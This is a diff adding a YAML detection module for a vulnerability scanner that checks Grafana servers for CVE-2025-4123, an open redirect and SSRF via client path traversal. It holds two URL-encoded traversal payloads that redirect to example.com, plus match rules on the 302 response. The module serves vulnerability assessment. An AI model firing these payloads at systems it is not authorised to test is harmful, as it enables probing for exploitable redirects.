@@ -1,0 +1,53 @@
+info:
+  name: grafana_cve_2025_4123_vuln
+  author: Swarnim Bandekar
+  severity: 6.1
+  description: Grafana XSS / Open Redirect / SSRF via Client Path Traversal (CVE-2025-4123)
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-4123
+    - https://grafana.com/security/security-advisories/cve-2025-4123/
+    - 
+  profiles:
+    - vuln
+    - http
+    - grafana
+    - cve2025
+    - openredirect
+    - SSRF
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 5
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{request_path}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 3000
+                - 80
+                - 443
+              request_path:
+                - "public/..%2F%5cexample.com%2F%3f%2F..%2F.."
+                - "render/public/..%252f%255cexample.com%252f%253F%252f..%252f.."
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "302"
+              reverse: false
+            headers:
+              Location:
+                regex: ".*example\\.com.*"
+                reverse: false
